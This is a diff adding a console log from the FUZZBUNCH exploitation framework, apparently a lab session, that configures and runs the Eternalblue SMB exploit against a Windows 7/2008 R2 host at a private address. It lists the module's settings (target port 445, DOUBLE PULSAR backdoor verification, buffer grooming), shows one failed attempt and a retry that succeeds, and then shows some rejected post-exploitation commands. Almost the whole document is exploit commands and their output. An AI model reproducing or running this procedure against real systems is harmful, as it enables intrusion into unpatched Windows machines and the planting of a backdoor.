@@ -1,0 +1,216 @@
+[+] Set Project => win7ultx64
+
+fb > use eternal
+[-] Error: Plugin eternal not found!
+fb > use eternalblue
+
+[!] Entering Plugin Context :: Eternalblue
+[*] Applying Global Variables
+[+] Set NetworkTimeout => 60
+[+] Set TargetIp => 192.168.0.47
+
+fb Special (Eternalblue) > apply
+[*] Applying Session Parameters
+fb Special (Eternalblue) > echo Running Exploit Touches
+[*] Running Exploit Touches
+fb Special (Eternalblue) > touch all
+fb Special (Eternalblue) > enter Special
+
+fb Special (Eternalblue) > prompt confirm
+
+[!] Enter Prompt Mode :: Eternalblue
+
+Module: Eternalblue
+===================
+
+Name                  Value                                                 
+----                  -----                                                 
+NetworkTimeout        60                                                    
+TargetIp              192.168.0.47                                          
+TargetPort            445                                                   
+VerifyTarget          True                                                  
+VerifyBackdoor        True                                                  
+MaxExploitAttempts    3                                                     
+GroomAllocations      12                                                    
+Target                WIN72K8R2                                             
+
+[!] plugin variables are valid
+
+[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
+
+
+[*]  TargetIp :: Target IP Address
+
+
+[*]  TargetPort :: Port used by the SMB service for exploit connection
+
+
+[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
+
+
+[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
+
+
+[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
+
+
+[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
+
+
+[*]  Target :: Operating System, Service Pack, and Architecture of target OS
+
+    0) XP            Windows XP 32-Bit All Service Packs
+   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+
+
+fb Special (Eternalblue) > execute
+
+[!] Preparing to Execute Eternalblue
+
+[*]  Mode :: Delivery mechanism
+
+   *0) DANE     Forward deployment via DARINGNEOPHYTE
+    1) FB       Traditional deployment from within FUZZBUNCH
+
+[+] Run Mode: FB
+
+[*] Redirection OFF
+
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[+] (TCP) Local 192.168.0.47:445
+
+[+] Configure Plugin Remote Tunnels
+
+
+Module: Eternalblue
+===================
+
+Name                  Value                                                 
+----                  -----                                                 
+DaveProxyPort         0                                                     
+NetworkTimeout        60                                                    
+TargetIp              192.168.0.47                                          
+TargetPort            445                                                   
+VerifyTarget          True                                                  
+VerifyBackdoor        True                                                  
+MaxExploitAttempts    3                                                     
+GroomAllocations      12                                                    
+ShellcodeBuffer                                                             
+Target                WIN72K8R2                                             
+
+[*] Executing Plugin
+[!] Plugin failed
+[-] Error: Eternalblue Failed
+fb Special (Eternalblue) > 
+fb Special (Eternalblue) > run
+[-] Unknown syntax: run
+fb Special (Eternalblue) > exploit
+[-] Unknown syntax: exploit
+fb Special (Eternalblue) > use eternalblue
+
+[!] Entering Plugin Context :: Eternalblue
+[*] Applying Global Variables
+[+] Set NetworkTimeout => 60
+[+] Set TargetIp => 192.168.0.47
+
+fb Special (Eternalblue) > apply
+[*] Applying Session Parameters
+fb Special (Eternalblue) > echo Running Exploit Touches
+[*] Running Exploit Touches
+fb Special (Eternalblue) > touch all
+fb Special (Eternalblue) > enter Special
+
+fb Special (Eternalblue) > prompt confirm
+
+[!] Enter Prompt Mode :: Eternalblue
+
+Module: Eternalblue
+===================
+
+Name                  Value                                                 
+----                  -----                                                 
+NetworkTimeout        60                                                    
+TargetIp              192.168.0.47                                          
+TargetPort            445                                                   
+VerifyTarget          True                                                  
+VerifyBackdoor        True                                                  
+MaxExploitAttempts    3                                                     
+GroomAllocations      12                                                    
+Target                WIN72K8R2                                             
+
+[!] plugin variables are valid
+
+[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.
+
+
+[*]  TargetIp :: Target IP Address
+
+
+[*]  TargetPort :: Port used by the SMB service for exploit connection
+
+
+[*]  VerifyTarget :: Validate the SMB string from target against the target selected before exploitation.
+
+
+[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor before throwing. This option must be enabled for multiple exploit attempts.
+
+
+[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Disabled for XP/2K3.
+
+
+[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup allocations (XK/2K3) to do.
+
+
+[*]  Target :: Operating System, Service Pack, and Architecture of target OS
+
+    0) XP            Windows XP 32-Bit All Service Packs
+   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs
+
+
+fb Special (Eternalblue) > execute
+
+[!] Preparing to Execute Eternalblue
+
+[*]  Mode :: Delivery mechanism
+
+   *0) DANE     Forward deployment via DARINGNEOPHYTE
+    1) FB       Traditional deployment from within FUZZBUNCH
+
+[+] Run Mode: FB
+
+[*] Redirection OFF
+
+[+] Configure Plugin Local Tunnels
+[+] Local Tunnel - local-tunnel-1
+[+] (TCP) Local 192.168.0.47:445
+
+[+] Configure Plugin Remote Tunnels
+
+
+Module: Eternalblue
+===================
+
+Name                  Value                                                 
+----                  -----                                                 
+DaveProxyPort         0                                                     
+NetworkTimeout        60                                                    
+TargetIp              192.168.0.47                                          
+TargetPort            445                                                   
+VerifyTarget          True                                                  
+VerifyBackdoor        True                                                  
+MaxExploitAttempts    3                                                     
+GroomAllocations      12                                                    
+ShellcodeBuffer                                                             
+Target                WIN72K8R2                                             
+
+[*] Executing Plugin
+[+] Eternalblue Succeeded
+
+fb Special (Eternalblue) > shell
+fb Special (Eternalblue) > getuid
+[-] Unknown syntax: getuid
+fb Special (Eternalblue) > exit
+fb > exit
+fb > back
+fb > quit
